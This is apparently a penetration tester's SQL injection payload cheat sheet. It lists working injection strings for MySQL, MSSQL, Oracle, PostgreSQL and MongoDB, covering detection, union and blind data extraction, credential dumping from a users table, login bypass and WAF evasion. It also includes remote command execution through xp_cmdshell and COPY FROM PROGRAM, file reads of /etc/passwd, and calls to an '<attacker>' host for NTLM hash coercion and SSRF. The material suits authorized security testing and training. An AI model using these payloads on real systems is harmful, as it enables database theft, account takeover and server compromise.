---
tags: [reference, sqli, payloads, injection]
---

# SQL Injection — Payload Reference

> Full guide with SQLMap: [[07-Web-Application/SQLi]]

## Detection

```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
1' ORDER BY 1--
1' ORDER BY 2--
1 AND 1=1
1 AND 1=2
```

## Union-Based (MySQL)

```sql
-- Determine column count
' ORDER BY 1--         → no error
' ORDER BY 2--         → no error
' ORDER BY N--         → error → N-1 columns

-- Find injectable position
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

-- Extract data
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password),3 FROM users--
```

## Error-Based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,database()))--
' AND (SELECT 1 FROM(SELECT COUNT(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
```

## Blind Boolean

```sql
-- True condition
' AND 1=1--
-- False condition
' AND 1=2--

-- Extract char by char
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--

-- Automate with SQLMap
sqlmap -u "url?id=1" --technique=B --level=3
```

## Time-Based Blind

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

## MSSQL Specific

```sql
-- Version
' UNION SELECT @@version,NULL--
-- List databases
' UNION SELECT name,NULL FROM master..sysdatabases--
-- xp_cmdshell RCE
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell('powershell -enc <base64>')--
-- Read file
'; BULK INSERT loot FROM 'C:\Windows\win.ini'--
-- NTLM hash coercion
'; EXEC xp_dirtree '\\<attacker>\share'--
```

## Oracle Specific

```sql
-- Version
' UNION SELECT banner,NULL FROM v$version--
-- Tables
' UNION SELECT table_name,NULL FROM all_tables--
-- Columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
-- UTL_HTTP SSRF
' UNION SELECT UTL_HTTP.REQUEST('http://<attacker>/'),NULL FROM dual--
```

## PostgreSQL Specific

```sql
-- Version
' UNION SELECT version(),NULL--
-- Read file
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
-- RCE via COPY
'; COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text)--
'; COPY cmd_exec FROM PROGRAM 'id'--
'; SELECT * FROM cmd_exec--
```

## Authentication Bypass

```sql
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 'x'='x
') OR ('x')=('x
')) OR (('x'))=(('x
```

## WAF Bypass

```sql
-- Case variation
SeLeCt, UnIoN

-- Comments as spaces
/**/UNION/**/SELECT/**/1,2,3--

-- URL encoding
%55NION %53ELECT
%27 OR %271%27=%271

-- Double encode
%2527 → %27 → '

-- Scientific notation (MySQL)
SELECT 1e0UNION SELECT 1,2,3

-- Inline comment
UN/**/ION SE/**/LECT 1,2,3
```

## NoSQL Injection (MongoDB)

```json
// Boolean-based
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}

// Regex
{"username": {"$regex": "admin"}, "password": {"$regex": ".*"}}

// HTTP parameter
username[$ne]=x&password[$ne]=x
username[$regex]=.*&password[$regex]=.*
```

## Related

- [[07-Web-Application/SQLi]] — Full SQLi guide with SQLMap
- [[05-Exploitation/Web-Apps]] — Web exploitation
